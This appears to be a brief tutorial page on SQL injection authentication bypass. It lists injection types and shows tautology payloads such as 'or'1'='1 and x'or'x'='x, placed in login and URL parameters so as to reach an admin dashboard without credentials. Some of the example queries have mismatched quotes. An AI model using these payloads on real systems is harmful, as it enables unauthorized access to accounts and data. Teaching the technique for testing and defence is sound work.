---
id: BypassAuthenticationSQLINJECTION 
title: Introduction to Bypass Authentication 
sidebar_label: Bypass Authentication SQL Injection 
---

Introduction to Bypass Authentication - SQL Injection
-----------------------------------------------------
SQL Injection : Its an attack used by hackers specially web application penetration testers by sending malicious sql queries to the database via application layer and then retrieve the desired results and information.

Sql Injection
-------------
1. Bypass Authentication Injection
2. Union based injection aka Advance SQLi
3. Error Based Injection
4. Blind SQL Injection
5. Time Based Injection
6. Double Query Injection
7. Stack Based Injection
and so on....

Bypass Authentication Attack: Attack which is mainly deployed on the front end of the website, especially on the admin login panel to gain admin dashborad access.

Username:test
Password:test
    Login

select * from users where username='test'and password='test' 'or'   1'='1;

'or'1'='1
 
Authentication Bypass
=====================
    1. Basic Authentication
    2. Integrated Authentication
    3. Digest Authentication
    4. Form Based Authentication
 
I will log in in the database as an administrator, with out having the credentials of the admin.
 
Gates --> AND | OR
 
Testing Payload --->    1'or'1'='1
 
https://www.abc.com/items.php?id=2
    Item name
    Item Price
 
Select item_name,item_price from items where username='1'or'2'='2'#
Select item_name,item_price from items where id=3;
 
Select item_name,item_price from items where id=2'
 
    1'or'1'='1 ---> True
    0'or'0'='0
    x'or'x'='x

